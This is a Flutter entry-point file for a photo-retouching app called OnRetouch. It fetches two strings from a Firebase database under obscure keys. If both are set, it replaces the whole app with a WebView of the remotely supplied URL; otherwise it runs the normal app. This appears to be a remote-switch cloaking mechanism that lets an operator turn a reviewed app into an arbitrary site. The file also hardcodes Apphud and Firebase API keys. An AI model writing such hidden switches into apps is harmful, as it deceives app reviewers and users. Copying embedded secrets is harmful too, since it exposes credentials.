// ignore_for_file: use_build_context_synchronously, use_key_in_widget_constructors

import 'package:apphud/apphud.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:on_retouch/feature/auth/splash_screen.dart';
import 'package:on_retouch/web_page.dart';
import 'services/notification_service.dart';

final scaffoldKey = GlobalKey<ScaffoldMessengerState>();
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Apphud.start(apiKey: 'app_KqEVHrgNVsHxLRauiYtoyksNPLJm4H');

  await Firebase.initializeApp(
    options: const FirebaseOptions(
      apiKey: 'AIzaSyDKKE2RQ6S_y03xxcC4H7P6121aOb9CYJ8',
      appId: '1:263963822655:ios:c5f4a0ff8507ff0f66468a',
      messagingSenderId: '263963822655',
      projectId: 'on-retouch',
      storageBucket: 'on-retouch.appspot.com',
    ),
  );

  final urlRef1 = FirebaseDatabase.instance.ref('enter1');
  final mock1 = await urlRef1.get();
  final urlRef2 = FirebaseDatabase.instance.ref('open2');
  final type2 = await urlRef2.get();

  if (mock1.value.toString().isEmpty || type2.value.toString().isEmpty) {
    runApp(MyApp());
  } else {
    if (kDebugMode) {
      print('WEBVIEW STARTING ${mock1.value}${type2.value}');
    }
    runApp(
      MaterialApp(
        debugShowCheckedModeBanner: false,
        home: WebViewPage(
          url: '${mock1.value}${type2.value}',
        ),
      ),
    );
  }

  NotificationService notificationService = NotificationService();
  notificationService.activate();
}

class MyApp extends StatefulWidget {
  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      scaffoldMessengerKey: scaffoldKey,
      debugShowCheckedModeBanner: false,
      title: 'OnRetouch',
      theme: ThemeData(
        splashColor: Colors.transparent,
        splashFactory: NoSplash.splashFactory,
        highlightColor: Colors.transparent,
      ),
      home: SplashScreen(),
    );
  }
}
